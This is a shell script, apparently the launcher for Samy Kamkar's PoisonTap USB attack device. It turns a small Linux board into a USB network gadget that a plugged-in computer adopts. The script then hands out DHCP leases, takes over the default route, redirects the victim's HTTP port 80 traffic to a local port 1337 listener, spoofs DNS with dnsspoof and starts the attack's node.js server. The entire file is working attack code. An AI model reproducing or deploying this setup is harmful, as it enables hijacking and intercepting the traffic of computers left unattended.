#!/bin/sh
#
# PoisonTap
#  by samy kamkar
#  http://samy.pl/poisontap
#  01/08/2016
#
# If you find this doesn't come up automatically as an ethernet device
# change idVendor/idProduct to 0x04b3/0x4010

cd /sys/kernel/config/usb_gadget/
mkdir -p poisontap
cd poisontap

HOST="48:6f:73:74:50:43"
SELF0="42:61:64:55:53:42"
SELF1="42:61:64:55:53:43"

#echo 0x0B95 > idVendor # ASIX
#echo 0x772B > idProduct # 8772B
#echo 0x0002 > bcdDevice # Revision 2 > 8772C
#echo 0x0bda > idVendor
#echo 0x8152 > idProduct
#echo 0x2001 > bcdDevice
echo 0x04b3 > idVendor  # IN CASE BELOW DOESN'T WORK
echo 0x4010 > idProduct # IN CASE BELOW DOESN'T WORK
#echo 0x1d6b > idVendor   # Linux Foundation
#echo 0x0104 > idProduct  # Multifunction Composite Gadget

echo 0x0100 > bcdDevice # v1.0.0
mkdir -p strings/0x409
echo "badc0deddeadbeef" > strings/0x409/serialnumber
echo "wismna" > strings/0x409/manufacturer
echo "PoisonTap" > strings/0x409/product

# Config 1: RNDIS
mkdir -p configs/c.1/strings/0x409
echo "0x80" > configs/c.1/bmAttributes
echo 250 > configs/c.1/MaxPower
echo "Config 1: RNDIS network" > configs/c.1/strings/0x409/configuration

echo "1" > os_desc/use
echo "0xcd" > os_desc/b_vendor_code
echo "MSFT100" > os_desc/qw_sign

mkdir -p functions/rndis.usb0
echo $SELF0 > functions/rndis.usb0/dev_addr
echo $HOST > functions/rndis.usb0/host_addr
echo "RNDIS" > functions/rndis.usb0/os_desc/interface.rndis/compatible_id
echo "5162001" > functions/rndis.usb0/os_desc/interface.rndis/sub_compatible_id

# Config 2: CDC ECM
mkdir -p configs/c.2/strings/0x409
echo "Config 2: ECM network" > configs/c.2/strings/0x409/configuration
echo 250 > configs/c.2/MaxPower

mkdir -p functions/ecm.usb0
# first byte of address must be even
echo $HOST > functions/ecm.usb0/host_addr
echo $SELF1 > functions/ecm.usb0/dev_addr

# Create the CDC ACM function
mkdir -p functions/acm.gs0

# Link everything and bind the USB device
ln -s configs/c.1 os_desc

ln -s functions/rndis.usb0 configs/c.1

ln -s functions/ecm.usb0 configs/c.2
ln -s functions/acm.gs0 configs/c.2
# End functions
ls /sys/class/udc > UDC

ifup br0
ifconfig br0 up

/sbin/route add -net 0.0.0.0/0 br0
/etc/init.d/isc-dhcp-server start

#/sbin/sysctl -w net.ipv4.ip_forward=1
/sbin/iptables -t nat -A PREROUTING -i br0 -p tcp --dport 80 -j REDIRECT --to-port 1337
/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i br0 port 53
/usr/bin/screen -dmS node /usr/bin/nodejs /home/pi/poisontap/pi_poisontap.js 

systemctl enable getty@ttyGS0.service
